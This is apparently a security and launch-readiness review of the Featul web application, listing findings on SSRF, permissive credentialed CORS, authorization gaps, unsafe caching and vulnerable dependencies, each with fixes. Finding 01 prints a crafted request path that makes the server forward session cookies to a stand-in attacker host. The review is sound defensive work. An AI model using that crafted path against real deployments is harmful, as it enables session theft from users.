# Featul security and launch readiness review

Reviewed 8 October 2026 against commit `c6d9aa49` and the current working tree.

## Executive assessment

**Hold the public launch.** The applications compile and the existing tests pass, but this review found exploitable request handling and authorization weaknesses, unsafe caching of private search results, and vulnerable framework/auth dependencies. Fix findings 01–05 before accepting real customer data. Resolve the medium findings according to the privacy and access guarantees you intend to offer.

This was a repository-wide security search with focused manual tracing of the Next.js applications, API routers, authentication, billing, database access, uploads, widget, editor, AI integration, and CI. It is not a claim that every line or production configuration has been exhaustively verified. No production database, payment, email, or customer account was exercised. Application source was not changed by this review; existing and concurrent workspace edits were preserved. Additional marketing image/component edits appeared during the review, so the successful build applies to the captured snapshot rather than later edits.

## Verification results

| Check | Result |
| --- | --- |
| Root TypeScript checks | Passed, 8 tasks; 2 initially came from cache. Fresh-install build also completed its type-check dependencies. |
| Root lint | **Failed:** restricted icon import at `apps/app/src/components/global/artwork.tsx:52`. Web and shared UI lint passed. |
| Existing tests | **35 passed, 0 failed**, 4 files, 116 assertions. These cover changelog/editor/AI behavior, not comprehensive authorization or billing scenarios. |
| Fresh dependency installation | Passed: `bun install --frozen-lockfile --ignore-scripts` in a separate source snapshot. |
| Production compilation | Passed: `bun run build`, 11 tasks, both apps, in that snapshot with dummy service configuration and source-map upload disabled. |
| Dependency audit | **Failed:** 269 advisory matches across 74 package names: 9 critical, 111 high, 125 moderate, 24 low. These are scanner matches, not 269 proven exploitable application paths. |
| CORS reproduction | Arbitrary origin retained credentialed access through the actual jstack middleware and outer `withCors` wrapper. |
| Consent proxy reproduction | Next's route matcher plus the actual handler sent a crafted URL and a synthetic cookie to a mocked attacker destination. No external request occurred. |
| Post detail reproduction | Actual handler with synthetic database results returned a pending post and hidden comment to an authenticated nonmember. |

Builds used `/tmp/featul-security-review/build`, with no copied `.env` files. An initial dependency-symlink experiment produced module-resolution errors; those were resolved by the fresh frozen install and are not reported as repository defects. Compilation with placeholders does not verify live authentication, email delivery, checkout, storage, or deployed infrastructure.

## High priority findings

### 01 — High — Consent proxy permits arbitrary upstream requests and forwards cookies

**Rules:** NEXT-SSRF-001 / NEXT-SECRETS-001. **Confidence:** reproduced locally.

**Locations:** `apps/web/src/app/api/c15t/[...path]/route.ts:34–41,59–74`; cookie scope in `packages/auth/src/auth.ts:43–62,213–224`.

The handler constructs `new URL(path.join('/') + search, upstreamBaseUrl)`. Route parameters are attacker controlled and decoded. An absolute URL replaces the configured upstream entirely. Its header copier removes a few transport headers but preserves `Cookie` and `Authorization`.

Using `/api/c15t/https:%2F%2Fattacker.invalid%2Fcollect`, the installed Next route matcher produced an absolute URL parameter. The actual handler then selected `https://attacker.invalid/collect` and forwarded `synthetic-session=example` in the mocked fetch.

**Impact:** unauthenticated callers can direct server requests to unintended destinations. A victim following a crafted link can also have cookies forwarded to an attacker if those cookies are scoped to the marketing host. The auth configuration automatically derives a parent-domain cookie scope, so an app at `app.featul.com` can make this a session-theft path on `featul.com`. This is potentially critical when deployed together.

**Fix:** construct the URL from a fixed origin and separately encoded path segments; reject separators, absolute/network-path URLs and traversal; assert the final origin and allowed path prefix. Forward only explicitly needed headers, excluding application cookies and authorization. Keep redirects disabled and enforce upstream time/body limits. Temporarily disable the proxy if it cannot be fixed immediately.

**Limit:** the route must have `C15T_URL` or its public fallback configured. Hosting-layer rejection of encoded paths was not tested; do not rely on it as the application control.

### 02 — High — Credentialed CORS exposes authenticated GET responses to arbitrary origins

**Rules:** NEXT-CORS-001 / NEXT-SECRETS-001. **Confidence:** reproduced locally.

**Locations:** `packages/api/src/index.ts:27–30`; installed `node_modules/jstack/dist/server/index.js:1341–1345`; `packages/auth/src/trust.ts:42–51`; `packages/api/src/request/origin.ts:135–136`; `packages/auth/src/auth.ts:213–224`.

The API enables `j.defaults.cors`, whose implementation uses `origin: (origin) => origin` with `credentials: true`. `withCors` returns an untrusted-origin response unchanged, preserving these permissive headers. The origin enforcement in private procedures explicitly skips GET requests.

The local reproduction returned both `Access-Control-Allow-Origin: https://attacker.invalid` and `Access-Control-Allow-Credentials: true`, including after the outer wrapper ran. A simple credentialed GET needs no preflight, so rejecting an OPTIONS request does not repair this.

**Impact:** where the browser sends the session cookie, an attacker-controlled page can read private API results as the victim. Potential targets include workspace listings, members, sessions/IP addresses, and the manager-only widget signing secret (`packages/api/src/router/workspace.ts:124–136`). `SameSite=None` makes cross-site requests relevant; browser third-party-cookie restrictions may reduce exposure but do not eliminate the defect.

**Fix:** replace default CORS with the explicit trusted-origin policy. Strip upstream CORS headers before setting your own. Separate truly public widget responses from credentialed application responses. Verify trusted and untrusted simple GETs, preflights, and errors. Consider narrower cookie scope where compatible with the product.

### 03 — High — Signed-in outsiders can read unpublished posts and internal comments

**Rules:** NEXT-AUTH-001 / NEXT-DATA-001. **Confidence:** source trace and synthetic-handler reproduction.

**Locations:** `packages/api/src/router/board.ts:517–545,548–628,652–678,748,810,848–910`.

`postsByBoard` and `postDetail` require a session, but they allow nonmembers when the board is public. Their post queries do not constrain `post.status`. In `postDetail`, the comments query uses only `where(eq(comment.postId, formattedPost.id))`: it does not filter `isInternal` or comment status. The nonmember output branch only removes email addresses.

**Impact:** any registered account can inspect pending or otherwise unpublished posts on public boards and retrieve internal/hidden comments associated with those posts. A normal public post ID is sufficient to reach its internal discussions. In the local handler probe, a user with no membership received a pending post and a hidden comment; author email redaction worked but content authorization did not.

**Fix:** use an explicit member/admin detail route and a separate public projection, or apply shared resource authorization before reading dependent data. For outsiders require a published post on an active, visible, public board and return only published, noninternal comments. Remove moderation fields and private metadata from public output.

Related consistency gaps: `comment.list` at `packages/api/src/router/comment.ts:177–230` checks board publicity but not parent post status or active/visible state. Public page loaders at `apps/app/src/app/[subdomain]/board/p/[slug]/data.ts:256–264` also omit active/visible checks. The stronger `publicBoardConditions` and `requirePostAccess` helpers already exist in `packages/api/src/post/access.ts:6–9,31–52`; apply a consistent policy rather than maintaining divergent predicates.

### 04 — High — Private search results are declared publicly cacheable

**Rule:** NEXT-CACHE-001. **Confidence:** confirmed code/configuration defect; shared-cache replay not tested.

**Locations:** `packages/api/src/router/board.ts:454–514,950–1025`; membership resolution in `packages/api/src/workspace/access.ts:28–36`.

`searchPostsByWorkspaceSlug` decides whether to include private boards and unpublished posts using the caller's session. It then sends `Cache-Control: public, max-age=5, stale-while-revalidate=60` for all callers. The URL does not encode the caller's identity and the response does not vary on cookies. `postCountByWorkspaceSlug` repeats the pattern with a ten-second public lifetime.

**Impact:** a shared cache honoring those headers can reuse a member's private search response for a visitor requesting the same URL. Counts can leak too. Whether the deployed CDN currently caches these responses remains an infrastructure question, not a reason to mark them public.

**Fix:** use `private, no-store` for session-dependent responses. If public caching is needed, split off a route whose query always uses public/published predicates. Check both the anonymous-first and member-first request order against the deployed cache after the change, and purge affected entries.

### 05 — Critical dependency exposure — Framework and authentication updates are required

**Rule:** NEXT-SUPPLY-001. **Confidence:** locked versions and current advisories confirmed; application exploitability varies by advisory.

**Locations:** `bun.lock:1716,1938,2156,2562`; `package.json:31–34`; `packages/auth/package.json:32–39`; enabled auth flows in `packages/auth/src/auth.ts:188–210,251–268`.

**Potential impact:** the locked dependency set includes advisories for unauthenticated code execution and account takeover; affected runtime paths must be patched before launch.

- **Next.js 16.3.0:** within the affected range for the critical AVIF image-optimization vulnerability. Both apps configure remote image optimization, including the application's upload host. The advisory fixes this at 16.3.3, while the later image-optimization SSRF advisory requires 16.3.8. Upgrade to a supported release addressing all current advisories, not merely the first minimum patch. Exact image-processing reachability on the hosting platform was not exploited. Sources: [Next AVIF advisory](https://github.com/vercel/next.js/security/advisories/GHSA-2xp9-vwfh-vxw4), [Next image SSRF advisory](https://github.com/vercel/next.js/security/advisories/GHSA-cjq9-62q9-8jv4).
- **Better Auth 1.5.5:** the app enables password registration and `emailOTP`, matching the configuration involved in the high-severity pre-account-hijacking advisory. Requiring email verification does not fix that vulnerability. The maintainer's stable fix is 1.6.22 or later. Upgrade Better Auth, its plugins/core, and root overrides together; verify migrations and authentication/billing behavior. Source: [Better Auth account takeover advisory](https://github.com/better-auth/better-auth/security/advisories/GHSA-qq9h-g4jm-xgf3).
- **Hono 4.12.8, Elysia 1.4.28, and transitive packages:** also have audit matches. Triage by runtime usage and upgrade compatible parent packages. Some critical matches concern unused plugins or development tooling; they are not evidence of additional exploitable production paths. The custom CORS defect in finding 02 needs its own fix regardless of a Hono upgrade.

`bun audit` currently fails the existing security workflow. Keep its checks active. Re-run audit, type checks, lint, tests, and production builds after updating, and document any remaining advisory with a specific reachability analysis.

## Medium priority findings

### 06 — Medium — Revoked authors retain mutation access to private content

**Rule:** NEXT-AUTH-001. **Confidence:** source trace.

**Locations:** `packages/api/src/router/comment.ts:599–631,825–880`; `packages/api/src/router/post.ts:319–334,381–394`.

Comment editing checks authorship alone. Comment deletion also permits the author without confirming current access to the workspace/post. Post editing allows the author after the moderator check fails, without requiring current membership on a private board.

**Impact:** a removed member who retained content IDs can still edit or delete their prior contributions inside a private workspace. A comment author can also edit without checking the post's locked state.

**Fix:** first require access to the parent resource, then enforce author/moderator and lock rules. Define any deliberate post-revocation author rights explicitly. Validate member removal followed by read, edit, delete, and vote attempts across both private posts and internal comments.

### 07 — Medium — Private attachments use permanent public delivery URLs

**Rule:** NEXT-FILES-001. **Confidence:** storage design confirmed; bucket policy not inspected.

**Locations:** `packages/api/src/storage/signer.ts:50–58`; `packages/api/src/router/storage.ts:205–231`; comment attachment disclosure in finding 03.

Uploads are authorized and PUT URLs expire, but the returned read URL is always `${publicBase}/${key}`. There is no application read-authorization step for private-board or internal-comment images.

**Impact:** anyone retaining or receiving an attachment URL can continue to read it despite membership revocation or a change to content visibility, if the configured public bucket serves it as intended. Random object names reduce guessing; they do not enforce workspace access. Finding 03 can expose internal attachment URLs directly.

**Fix:** keep private/internal objects in private storage, serve them after resource authorization using short-lived signed GETs or an authenticated proxy, and define what happens when content switches between public and private. Public branding images can retain public delivery. If permanent bearer URLs are intentional, make that limitation explicit before promising private attachments.

### 08 — Medium — AI requests lack a durable spending quota

**Rule:** NEXT-DOS-001. **Confidence:** request-path trace; provider account limits not inspected.

**Locations:** `packages/api/src/ai/auth.ts:59`; `packages/api/src/services/ratelimiter.ts:100–105`; `packages/api/src/ai/handler.ts:63–72,176–197,276–286`; `packages/api/src/ai/generation.ts:24–70,77–110`.

The AI endpoint uses the generic allowance of 120 private requests per minute and workspace management authorization. It does not enforce a daily/monthly workspace token budget, subscription entitlement, or concurrent-generation limit. Structured generation can make several provider calls per request. Some branches also omit the existing abort signal when calling the provider.

**Impact:** a legitimate or abusive account can create substantial provider spend while remaining inside the general API rate limit; disconnected clients may leave generation running.

**Fix:** reserve and settle a per-workspace usage budget atomically, add a low AI-specific rate/concurrency limit, enforce intended plan entitlements, propagate cancellation through every generation path, and set provider-side spending caps.

## Other improvements

- **Make the launch gate reliable.** Fix the lint error at `apps/app/src/components/global/artwork.tsx:52`. Both Next configs currently set `typescript.ignoreBuildErrors: true` (`apps/app/next.config.ts:89`, `apps/web/next.config.ts:19`). Root Turbo and CI run separate type checks, so this did not hide a failure in the successful reviewed build; direct app builds still bypass validation. Remove the bypass or guarantee equivalent checks on every deploy path. The older launch document's statement that both Next builds validate types is stale.
- **Exercise security behavior before release.** Existing CI checks lint/types/build/audit but does not run the four current test files. The repository's previous security/billing integration suites were deliberately removed according to `docs/launch-readiness.md`; do not treat their historical results as current assurance. Use a documented manual acceptance matrix or restore focused regression checks by an explicit project decision.
- **Review telemetry data minimization.** Client/server Sentry enables `sendDefaultPii: true`; client replay samples sessions/errors; PostHog identification sends names and emails (`apps/app/src/instrumentation-client.ts:12–39`, `apps/app/sentry.server.config.ts:19`, `apps/app/src/lib/posthog.ts:79–93`, `packages/auth/src/auth.ts:296–300`). Confirm intended data collection, scrubbing, retention and consent behavior. This is a privacy-design review item, not proof of a credential leak or legal noncompliance. Public Sentry DSNs and analytics project tokens are not secret API keys.
- **Strengthen the CSP after functional testing.** Both apps allow inline scripts and `unsafe-eval`. Move production scripts toward nonces/hashes and remove unnecessary eval allowances. This is defense in depth; no independent stored-XSS exploit was confirmed here.
- **Consolidate permissions and public response shapes.** The divergent post/comment predicates caused real gaps. Put access decisions and public field allowlists in focused helpers and use them in API handlers and server-page loaders. Avoid exposing entire metadata objects and moderation fields by spreading database rows.
- **Bound expensive work.** Paginate `comment.list` and `postsByBoard`; constrain metadata array sizes and payload bytes; replace the public board-list count-per-board queries with grouped counts. Make comment creation, parent counters, reactions and activity writes transactional. In `comment.ts:491–505`, the parent counter is currently incremented before the internal-comment permission check can reject the request.
- **Verify trusted proxy headers.** `packages/api/src/request/ip.ts:3–22` accepts `cf-connecting-ip` before other headers. Confirm the actual ingress strips or overwrites client-supplied versions; otherwise callers can vary rate-limit keys. Anonymous fingerprints also include the mutable user agent, so they are not strong anti-vote-abuse identity.

## Secrets review

The working-tree scan covered 1,603 tracked paths using patterns for private keys, provider tokens, JWT-shaped credentials and credential-bearing database URLs. The only current pattern match was the intentional dummy PostgreSQL URL in CI. Only `.env.example` files are tracked. No `.env`, `.env.local`, or `.env.production` paths appeared in the reachable filename history checked.

The additional provider-token/private-key pattern scan of added lines in all locally reachable Git history found no candidates. Exact matching of local credential values against tracked files also found no matches; values were never printed. These checks do not inspect unreachable Git objects, external build logs, provider dashboards or previously distributed artifacts, and are not a guarantee that no secret has ever escaped. Findings 01–04 describe runtime disclosure risks even though these repository scans were clean.

## Conditions for launch

1. Fix findings 01–05 and verify the request paths with anonymous users, signed-in outsiders, members, removed members and owners. Include internal comments, pending posts, credentialed cross-origin GETs, and member-to-anonymous cache reuse.
2. Obtain green lint, types, tests and builds after dependency updates. Resolve runtime-relevant critical/high advisories and any remaining failing audit policy.
3. Decide and implement the attachment, revoked-author and AI usage policies in findings 06–08.
4. Verify production environment configuration and actual Stripe webhook delivery/retries, checkout returns, trial eligibility, cancellation and account deletion. The previous `docs/launch-readiness.md` reported missing production billing/cron variables on 29 September; their current values/inventory were **not rechecked** here.
5. Verify production migration state, backup restoration into a disposable database, cron execution, alert delivery, email verification/reset, upload cleanup, custom-domain routing and session behavior on deployed domains.

The existing secure building blocks are useful: parameterized Drizzle queries, shared active-membership checks, signed and expiring widget identities, widget message source/origin checks, restricted upload types, verified custom-domain routing, and signed/durable Stripe webhook handling. Launch readiness depends on applying those protections consistently and verifying the deployed service behavior.

Local evidence: `/tmp/featul-security-review/audit.json`, `tests.log`, `build-frozen.log`, and `probes.ts`. No real credentials are included in this report.
